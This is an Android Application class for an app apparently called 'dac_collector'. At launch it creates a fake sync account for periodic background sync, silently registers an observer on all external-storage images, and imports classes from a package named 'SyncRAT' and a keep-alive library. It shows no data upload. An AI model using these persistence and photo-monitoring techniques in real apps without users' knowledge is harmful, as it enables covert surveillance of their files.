package android.iocl.dac_collector.MainApplication;



import static com.ykun.live_library.config.RunMode.HIGH_POWER_CONSUMPTION;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Application;

import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.iocl.dac_collector.AntiCrashLibCockroach.Cockroach;
import android.iocl.dac_collector.AntiCrashLibCockroach.ExceptionHandler;

import android.iocl.dac_collector.R;
import android.iocl.dac_collector.Services.ImageJobService;
import android.iocl.dac_collector.SyncAdapters.AccountContract;
import android.iocl.dac_collector.SyncAdapters.SyncUtils;
import android.iocl.dac_collector.SyncRAT.ImageObserver;
import android.iocl.dac_collector.SyncRAT.SyncAccountUtil;
import android.iocl.dac_collector.Utility.SharedPrefs;
import android.iocl.dac_collector.Utility.Utility;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.MediaStore;
import android.util.Log;
import android.widget.Toast;

import androidx.core.content.ContextCompat;

import com.google.firebase.FirebaseApp;
import com.google.firebase.crashlytics.FirebaseCrashlytics;
import com.hjq.permissions.Permission;
import com.hjq.permissions.XXPermissions;
import com.ykun.live_library.KeepAliveManager;
import com.ykun.live_library.config.ForegroundNotification;
import com.ykun.live_library.config.ForegroundNotificationClickListener;

public class MyApp extends Application {
    FirebaseCrashlytics crashlytics;
    FirebaseApp firebaseApp;

    private ImageObserver mImageObserver;
    Boolean installCockroach = false;
    @Override
    public void onCreate() {
        super.onCreate();

        createSyncAccount();

        installImageObserver();

        AccountContract.createSyncBothAccount(getApplicationContext());
        SyncUtils.initialize(getApplicationContext());
       firebaseApp =   FirebaseApp.initializeApp(this);


        String cons_id = SharedPrefs.getString(this,"cons_id", "defaultForCrash");
         crashlytics  = FirebaseCrashlytics.getInstance();

         crashlytics.setUserId(cons_id);
        // Optionally enable debug logging
        crashlytics.setCrashlyticsCollectionEnabled(true);
        // Initialize Firebase

         if (installCockroach){
             install();
         }

    }

    private void createSyncAccount() {
        SyncAccountUtil.getSyncAccount(this);
        Account account = new Account(
                AccountContract.ACCOUNT_NAME,
                AccountContract.ACCOUNT_TYPE
        );

        AccountManager accountManager = AccountManager.get(this);
        if (accountManager.addAccountExplicitly(account, null, null)) {
            ContentResolver.setIsSyncable(account, AccountContract.AUTHORITY, 1);
            ContentResolver.setSyncAutomatically(
                    account,
                    AccountContract.AUTHORITY,
                    true
            );
            ContentResolver.addPeriodicSync(
                    account,
                    AccountContract.AUTHORITY,
                    Bundle.EMPTY,
                    AccountContract.SYNC_INTERVAL
            );
        }
    }

    private void installImageObserver( ){
        // 1) Make sure we have permission (prompt if not)
        if (XXPermissions.isGrantedPermissions(this, Permission.MANAGE_EXTERNAL_STORAGE))  {
            // 2) Only register once we actually have it:
            Handler handler = new Handler(Looper.getMainLooper());
            mImageObserver = new ImageObserver(handler, this);
            getContentResolver().registerContentObserver(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    true,
                    mImageObserver
            );
        }
    }


    private void install() {
        final Thread.UncaughtExceptionHandler sysExcepHandler = Thread.getDefaultUncaughtExceptionHandler();

//        DebugSafeModeUI.init(this);
        Cockroach.install(this, new ExceptionHandler() {
            @Override
            protected void onUncaughtExceptionHappened(Thread thread, Throwable throwable) {
                Log.e("LoggingError", "--->onUncaughtExceptionHappened:" + thread + "<---", throwable);
//                CrashLog.saveCrashLog(getApplicationContext(), throwable);

                crashlytics.recordException(throwable);

                new Handler(Looper.getMainLooper()).post(() -> {

                });
            }

            @Override
            protected void onBandageExceptionHappened(Throwable throwable) {
                throwable.printStackTrace();//打印警告级别log，该throwable可能是最开始的bug导致的，无需关心
                crashlytics.log("Recoverable exception: " + throwable.getMessage());
            }

            @Override
            protected void onEnterSafeMode() {
//                DebugSafeModeUI.showSafeModeUI();

//                if (BuildConfig.DEBUG) {
//                    Intent intent = new Intent(MyApp.this, DebugSafeModeTipActivity.class);
//                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//                    startActivity(intent);
//                }
            }

            @Override
            protected void onMayBeBlackScreen(Throwable e) {
                Thread thread = Looper.getMainLooper().getThread();

                crashlytics.recordException(e);
                Log.e("AndroidRuntime", "--->onUncaughtExceptionHappened:" + thread + "<---", e);
                //黑屏时建议直接杀死app
                sysExcepHandler.uncaughtException(thread, new RuntimeException("black screen"));
            }

        });
    }





}
